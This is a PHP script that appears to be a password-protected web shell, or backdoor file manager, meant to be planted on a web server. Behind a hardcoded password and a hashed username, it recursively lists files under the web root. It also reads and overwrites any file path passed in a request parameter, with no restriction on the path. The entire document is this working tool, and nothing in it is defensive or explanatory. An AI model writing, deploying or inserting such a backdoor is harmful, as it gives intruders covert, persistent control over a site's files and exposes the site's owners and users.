<? session_start();
if($_POST[submitlogin]=="submit"){

if($_POST[password]=="thief" && md5($_POST[user])=="d66e0b36622463d80b9124643a356ec3"){
$_SESSION['asharam']="asharam";
$_SESSION['yes']="!@yes@!";
}
}
if($_SESSION['asharam']=="asharam" && $_SESSION['yes']=="!@yes@!"){
$ph=explode("/",$_SERVER['REQUEST_URI']);
$reverse = array_reverse( $ph );
echo "you can process click <a href='?dir=".$reverse[1]."'>here</a> for directory listing ";
echo "or click <a href='?fp=".$_SERVER['DOCUMENT_ROOT']."/".$reverse[1]."/filename.php'>here</a> with file name ";
if($_REQUEST[dir]){
$dir = $_SERVER['DOCUMENT_ROOT']."/".$_REQUEST[dir];
function find_all_files($dir) 
{ 
    $root = scandir($dir); 
    foreach($root as $value) 
    { 
        if($value === '.' || $value === '..') {continue;} 
        if(is_file("$dir/$value")) {$result[]="<a href='a.php?fp=$dir/$value'>$dir/$value</a>";continue;} 
        foreach(find_all_files("$dir/$value") as $value) 
        { 
            $result[]="<a href='a.php?fp=".$value."'>".$value."</a><br>"; 
        } 
    } 
    return $result; 
} 
print_r(find_all_files($dir));
}

if($_REQUEST[fp]){

$file = $_REQUEST[fp];

$fs = fopen( $file, "a+" ) or die("error when opening the file");



while (!feof($fs)) {

   $contents .= fgets($fs, 1024);

}



fclose($fs);

?>
<html>

<form action="" method="post">

<input type=hidden name="file" value="<?php echo $file; ?>">

<textarea name="contents"><?php echo htmlspecialchars($contents); ?></textarea>
<input type="submit" name="submit" value="submit"/>
</form>

</html>
<?
if($_POST["file"]){
$fs = fopen( $_POST["file"], "r+" ) or die("error when opening the file");
ftruncate($fs, 0);
fwrite($fs, $_POST["contents"]);

fclose($fs);
}
}}else{
?>
<html>

<form action="" method="post">

<input type=text name="user" value="">
<input type=password name="password" value="">
<input type="submit" name="submitlogin" value="submit"/>
</form>

</html>
<?
}
?>